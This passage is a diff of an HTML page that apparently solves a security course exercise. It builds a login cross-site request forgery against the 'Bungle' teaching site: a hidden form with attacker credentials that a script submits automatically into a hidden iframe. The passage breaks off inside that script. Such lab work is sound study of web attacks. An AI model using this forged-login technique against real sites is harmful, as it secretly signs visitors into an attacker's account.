@@ -1,17 +1,17 @@
 <!DOCTYPE html>
 <html lang="en">
   <body>
-    <iframe name="frame" hidden></iframe>
+    <iframe name="simpleFrame" hidden></iframe>
     <form
       id="simpleForm"
       action="https://bungle.sysnet.ucsd.edu/login"
-      method="POST"
-      target="frame"
+      method="post"
+      target="simpleFrame"
     >
-      <input type="hidden" id="username" name="username" value="attacker" />
-      <input type="hidden" id="userpass" name="password" value="l33th4x" />
-      <input type="hidden" name="xssdefense" value="4" />
-      <input type="hidden" name="csrfdefense" value="0" />
+      <input name="xssdefense" value="4" type="hidden" />
+      <input name="csrfdefense" value="0" type="hidden" />
+      <input id="username" name="username" value="attacker" type="hidden" />
+      <input id="userpass" name="password" value="l33th4x" type="hidden" />
     </form>
     <script>
       document.getElementById("simpleForm").submit();
